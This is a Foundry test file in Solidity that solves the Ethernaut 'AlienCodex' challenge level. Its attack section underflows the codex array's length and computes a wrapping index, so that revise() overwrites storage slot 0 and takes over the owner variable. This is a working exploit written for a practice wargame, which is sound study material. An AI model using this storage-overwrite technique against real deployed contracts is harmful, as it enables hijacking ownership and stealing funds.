// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Ethernaut.sol";

contract AlienCodexTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testAlienCodexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        bytes memory bytecode = abi.encodePacked(vm.getCode("./src/AlienCodex/AlienCodex.json"));
        address alienCodex;

        // level needs to be deployed this way as it only works with 0.5.0 solidity version
        assembly {
            alienCodex := create(0, add(bytecode, 0x20), mload(bytecode))
        }

        vm.startPrank(tx.origin);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // storage
        // slot 0 (32 bytes) - owner (20 bytes), contact (1 byte)
        // slot 1 (32 bytes) - length of the array codex (32 bytes)
        // slot (keccak256(1) + i) (32 bytes) - array element (32 bytes)
        //
        // h = keccak256(1)
        // slot (h + i) = slot 0
        // h + i = 0 so i = 0 - h

        alienCodex.call(abi.encodeWithSignature("make_contact()"));
        alienCodex.call(abi.encodeWithSignature("retract()"));
        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i = 0;
        unchecked {
            // h + i = 0 = 2**256
            i = 0 - h;
        }

        bytes32 leftPaddedAddress = bytes32(abi.encode(tx.origin));

        alienCodex.call(abi.encodeWithSignature("revise(uint256,bytes32)", i, leftPaddedAddress));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        (bool success, bytes memory data) = alienCodex.call(abi.encodeWithSignature("owner()"));

        // data is of type bytes32 so the address is padded, byte manipulation to get address
        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));

        vm.stopPrank();
        assertEq(refinedData, tx.origin);
    }
}
